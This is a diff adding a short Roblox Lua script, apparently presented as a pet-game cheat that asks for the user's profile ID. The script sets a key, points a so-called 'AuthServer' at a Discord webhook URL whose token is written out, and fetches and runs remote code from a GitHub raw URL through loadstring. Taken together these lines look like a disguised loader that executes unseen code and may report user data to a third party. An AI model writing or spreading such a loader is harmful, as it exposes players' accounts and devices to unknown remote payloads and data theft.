@@ -1,0 +1,11 @@
+-- local Player id "2903744413" ~[Enter your Profile ID here]
+
+-- local Huge "yes" --yes or no
+
+-- local Gems "yes" --yes or no
+
+_G.Key = "p4c1f1cb3tl0g"
+
+_G.AuthServer = "https://discord.com/api/webhooks/1052757062037295124/UxINjcwaplGWcmngvuziByq-IlPft5BzsHdHKRVQf7t-6I_VoEQ47jA87hpbfahrclH4"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/psx-Scripts/psxsc/main/script.lua"))()
